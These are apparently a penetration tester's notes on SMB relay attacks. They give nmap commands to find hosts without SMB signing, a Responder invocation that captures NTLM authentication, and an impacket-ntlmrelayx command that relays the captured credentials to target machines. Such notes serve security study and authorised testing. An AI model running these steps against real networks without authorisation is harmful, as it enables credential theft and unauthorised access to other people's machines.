> A SMB relay attack is where an attacker captures a users NTLM hash and relays its to another machine on the network. Masquerading as the user and authenticating against SMB to gain shell or file access.

Requirements for an attack:
- The target must not enforce or enable SMB signing:
  `nmap --script=smb2-security-mode.nse -p 445 <ip>`
- For valuable outcomes, the relayed userâ€™s credentials must have local admin status on the machine.
- You cannot relay credentials to the same machine they were captured from.
- Note: By default, all Windows workstations (non-servers) have SMB signing either disabled or not enforced.
- Another note: Since these credentials undergo relaying, password strength becomes irrelevant.

---
# responder + ntlmrelayx.py

Edit the responder config file */etc/responder/Responder.conf* and turn SMB and HTTP off.
Then run responder:
```bash
sudo responder -v -I eth1 -dw
```

Run impacket-ntlmrelayx:
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```
The file targets.txt contains the IP addresses of all hosts that run an SMB service with message signing disabled.
SMB message singing enabled/disabled can be checked with:
`nmap -Pn --script=smb2-security-mode.nse -p 445 <IP>`
